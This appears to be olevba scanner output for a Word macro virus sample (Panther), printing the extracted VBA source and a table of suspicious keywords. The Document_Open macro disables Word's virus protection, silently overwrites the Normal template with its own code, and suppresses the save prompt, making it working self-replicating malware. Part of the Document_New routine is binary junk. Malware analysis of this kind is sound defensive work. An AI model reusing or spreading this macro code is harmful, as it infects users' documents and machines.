olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Panther.r-36a67407cd9a3a168b7638a65e39c91fe9ff0be6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Panther.r-36a67407cd9a3a168b7638a65e39c91fe9ff0be6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()

End Sub

Private Sub Document_New()
ÐÏà¡±á











































°Š#�7$�M%°


ð\x08
ð\x08

ð
ð\x08
















r



End Sub

Private Sub Document_Open()
    Dim code As String
    If Left$(NormalTemplate.Name, 8) <> "Document" Then
        Options.VirusProtection = False
        With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
            code = .Lines(1, .CountOfLines)
            ReplaceTemplate code, "Normal", "Template", "Happy", "Panther"
            ReplaceTemplate code, "Active", "Document", "Normal", "Template"
            ReplaceTemplate code, "Happy", "Panther", "Active", "Document"
            With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
                .DeleteLines 1, .CountOfLines
                .AddFromString code
            End With
        End With
        Options.SaveNormalPrompt = False
       End If
End Sub
Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String)
    Dim index As Long, pre As String, post As String, preLen As Long
    
    pre = prepre + prepost
    post = postpre + postpost
    
    index = 1
    preLen = Len(pre)
    
    While InStr(index, target, pre) <> 0
        index = InStr(index, target, pre)
        target = Left(target, index - 1) + post + Mid$(target, index + preLen)
        index = index + 1
    Wend
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

